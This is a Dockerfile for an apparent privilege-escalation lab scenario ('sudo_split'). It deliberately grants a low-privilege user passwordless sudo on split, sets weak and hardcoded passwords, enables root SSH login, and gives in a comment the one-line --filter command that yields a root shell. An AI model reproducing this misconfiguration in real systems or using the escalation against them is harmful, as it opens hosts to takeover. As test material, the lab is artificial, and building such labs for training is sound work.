FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_split
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/split as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and coreutils (split is part of coreutils)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        coreutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify split is installed
RUN which split && ls -la /usr/bin/split

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# split has a --filter option that executes a shell command for each output chunk.
# Exploit: sudo split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
# This spawns an interactive root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/split" > /etc/sudoers.d/split && \
    chmod 440 /etc/sudoers.d/split

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]